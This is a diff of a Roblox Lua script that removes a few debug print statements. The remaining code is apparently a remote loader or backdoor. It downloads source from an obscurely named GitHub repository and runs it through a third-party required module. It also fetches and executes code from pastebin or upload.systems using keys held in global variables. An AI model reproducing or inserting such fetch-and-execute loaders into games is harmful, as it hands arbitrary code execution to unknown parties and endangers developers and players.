@@ -1,11 +1,7 @@
-print("loadway1")
-print("loadway2")
 local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
 require(8082203830):Loadstring(Source)
-print("loadway2")
 local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
 if _G.IncreaseronLoaderSite=="us"then
-	print("loadway3")
 	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/".._G.IncreaseronLoaderKey.."/raw")))()
 elseif _G.IncreaseronLoaderSite=="pa"then
 	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://pastebin.com/raw/".._G.IncreaseronLoaderKey)))()
